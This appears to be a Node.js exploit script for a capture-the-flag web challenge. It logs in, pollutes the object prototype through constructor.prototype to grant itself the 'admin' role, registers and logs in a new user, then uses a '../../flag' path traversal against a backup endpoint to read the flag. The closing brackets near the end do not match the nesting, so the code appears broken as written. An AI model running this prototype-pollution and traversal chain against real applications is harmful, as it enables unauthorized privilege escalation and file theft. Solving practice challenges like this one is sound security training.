
const http = require('http');
const querystring = require('querystring');

// Proper order, reconnected
console.log("🚀 Starting proper order...");
console.log("1. Login existing user");

const existingUid = "2ca01c4924cc40e5b0c303f33d0aa184";
const loginData = querystring.stringify({uid: existingUid});

const makeRequest = function(options, callback) {
  const req = http.request(options, callback);
  req.on('error', callback);
  req.end();
};

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

makeRequest(loginOpts, function(err, res) {
  if(err) {
    console.error("Login error", err);
    return;
  }
  let cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("✅ Login done, poisoning...");

  const poisonData = JSON.stringify({
    uid: existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  makeRequest(poisonOpts, function(err, poisonRes) {
    if(err) {
      console.error("Poison error", err);
      return;
    }
    let poisonBody = '';
    poisonRes.on('data', chunk => poisonBody += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Poison complete! Registering new user...");
      const regData = querystring.stringify({username: "finalfinaldone"});
      const regOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/register',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(regData)
        }
      };

      makeRequest(regOpts, function(err, regRes) {
        if(err) {
          console.error("Register error", err);
          return;
        }
        let regBody = '';
        regRes.on('data', chunk => regBody += chunk);
        regRes.on('end', () => {
          const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
          if(match) {
            const newUid = match[1];
            console.log(`✅ Registered new user, UID: ${newUid}`);
            console.log("Logging in...");
            const newLoginData = querystring.stringify({uid: newUid});
            const newLoginOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/login',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(newLoginData)
              }
            };

            makeRequest(newLoginOpts, function(err, newLoginRes) {
              if(err) {
                console.error("New login error", err);
                return;
              }
              const newCookie = newLoginRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
              console.log("✅ Logged in, getting flag...");
              const flagData = querystring.stringify({file: '../../flag'});
              const flagOpts = {
                hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                port: 80,
                path: '/api/backup',
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Content-Length': Buffer.byteLength(flagData),
                  'Cookie': newCookie
                }
              };

              makeRequest(flagOpts, function(err, flagRes) {
                if(err) {
                  console.error("Flag request error", err);
                  return;
                }
                let flagBody = '';
                flagRes.on('data', chunk => flagBody += chunk);
                flagRes.on('end', () => {
                  console.log("\n\n🎯🎯🎯 FINAL FLAG:");
                  console.log(flagBody);
                });
              });
            });
          });
        }
      });
    });
  });
});
});
